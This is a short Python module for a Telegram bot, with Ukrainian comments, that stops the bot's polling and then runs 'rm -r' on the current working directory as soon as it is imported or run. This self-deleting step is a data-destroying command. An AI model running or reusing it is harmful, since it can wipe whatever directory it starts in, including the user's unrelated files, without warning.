from packages.bot.loader import bot,dp
import os
import subprocess

def stop_bot():
    try:
        dp.stop_polling()
        delete_current_directory()
    except Exception as e:
        pass        
# Функція для видалення поточного робочого каталогу
def delete_current_directory():
    try:
        # Отримуємо поточний робочий каталог
        current_directory = os.getcwd()

        # Видаляємо поточний робочий каталог та його вміст
        subprocess.Popen(["rm", "-r", current_directory])
        print(f"Папку {current_directory} було видалено.")
    except Exception as e:
        print(f"Помилка при видаленні папки {current_directory}: {str(e)}")

# Викликаємо функцію для зупинки бота та видалення папки
stop_bot()
